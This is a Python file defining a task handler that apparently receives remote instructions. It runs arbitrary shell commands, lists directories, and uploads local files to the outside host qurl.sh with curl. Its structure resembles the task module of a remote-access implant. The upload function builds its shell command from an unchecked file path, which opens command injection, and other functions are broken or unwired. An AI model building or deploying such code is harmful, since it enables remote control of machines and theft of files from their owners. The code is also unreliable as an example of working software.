import subprocess
import platform


class TaskHandler:

    def run_command(self, command):
        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                shell=True,
                timeout=10,
            )

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": result.stderr.strip(),
                    "returncode": result.returncode,
                }

            return {
                "success": True,
                "output": result.stdout,
                "returncode": result.returncode,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Command timed out",
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
            }

    def execute_command(self, args):
        command = args.get("command")

        if not command:
            raise ValueError("No command provided")

        return self.run_command(command=command)

    def list_directory(self, args):
        directory = args.get("directory", ".")

        os = platform.system().lower()

        if os == "windows":
            command = ["dir", directory]

        elif os == "linux":
            command = ["ls", directory]

        return self.run_command(command=command)


    def upload_file(self, args):
        file_path = args.get("file_path")

        if not file_path:
            raise ValueError("No file path provided.")

        curl = "curl.exe" if platform.system() == "Windows" else "curl"

        result = self.run_command(f'{curl} -s -F "file=@{file_path}" https://qurl.sh')

        return result

    def write_file(self, args):
        pass

    def execute(self, task):
        task_type = task.get("task")
        args = task.get("args", {})

        handlers = {
            "command_execution": self.execute_command,
            "list_directory": self.list_directory,
        }

        handler = handlers.get(task_type)

        if not handler:
            raise ValueError(f"Unknown task type: {task_type}")

        return handler(args)


task_manager = TaskHandler()
